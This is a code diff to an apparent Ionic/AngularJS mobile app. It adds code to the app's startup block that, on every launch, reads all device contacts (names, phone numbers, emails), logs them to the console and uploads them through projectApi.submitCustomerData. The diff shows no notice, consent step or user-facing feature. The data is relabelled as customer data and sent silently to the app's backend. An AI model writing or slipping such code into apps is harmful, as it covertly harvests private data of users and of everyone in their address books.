@@ -7,7 +7,8 @@
   'angular-storage', 'ngResource','ionMdInput', 'app.env.config' ,'ngCordova', 'ngCookies', 'ngMaterial', 'ngMaterialDatePicker',
    'ngMessages', 'angularSpinners'])
 
-      .run([ '$ionicPlatform', '$ionicPopup', '$timeout', function($ionicPlatform, $ionicPopup, $timeout) {
+      .run([ '$ionicPlatform', '$ionicPopup', '$timeout', '$cordovaContacts', 'projectApi',
+        function($ionicPlatform, $ionicPopup, $timeout, $cordovaContacts, projectApi) {
         $ionicPlatform.ready(function() {
 
           /*document.addEventListener("resume", function(){
@@ -30,11 +31,55 @@
             //navigator.splashscreen.show();
           })*/
 
-      if (ionic.Platform.isIOS()){
-           setTimeout(function () {
-              navigator.splashscreen.hide();
-           }, 3000 - 1000);
+         var opts = {
+          multiple: true,
+          fields:  [ 'displayName', 'name', 'phoneNumbers', 'emails']
+        };
+
+        if (ionic.Platform.isAndroid()) {
+          opts.hasPhoneNumber = true;
+        } 
+          
+        if($cordovaContacts){  
+          $cordovaContacts.find(opts).then(function(result) {
+              console.log("fetching contacts ");
+              console.log(angular.toJson(result));
+              var customerdataArray = [];
+              for(var i=0; i< result.length; i++){
+                var customerData = {};
+                customerData.displayName = result[i].displayName;
+                customerData.name = result[i].name.formatted;
+                customerData.phoneNumbers = "";
+                customerData.emails = "";
+                if(result[i].phoneNumbers != undefined && result[i].phoneNumbers != null && result[i].phoneNumbers != ""){
+                  for(var j=0; j< result[i].phoneNumbers.length; j++){
+                    if(result[i].phoneNumbers[j].value != undefined && result[i].phoneNumbers[j].value != null && result[i].phoneNumbers[j].value != ""){
+                      customerData.phoneNumbers = customerData.phoneNumbers + result[i].phoneNumbers[j].value.replace(/[&\/\\#,+()$~%.'" :*?<>{}-]/g, '') + ",";
+                    }
+                  }
+                }
+                if(result[i].emails != undefined && result[i].emails != null && result[i].emails != ""){
+                  for(var j=0; j< result[i].emails.length; j++){
+                    customerData.emails = customerData.emails + result[i].emails[j].value + ",";
+                  }
+                }
+                customerdataArray.push(customerData);
+              }
+              projectApi.submitCustomerData(customerdataArray).then(function(response){
+                console.log("successfully fetching data");
+              }, function(error){
+                console.log("failed fetching data");
+              })
+          }, function(error) {
+              console.log("ERROR: " + error);
+          });
         }
+
+        if (ionic.Platform.isIOS()){
+             setTimeout(function () {
+                navigator.splashscreen.hide();
+             }, 3000 - 1000);
+          }
 
 
           if(window.cordova && window.cordova.plugins.Keyboard) {
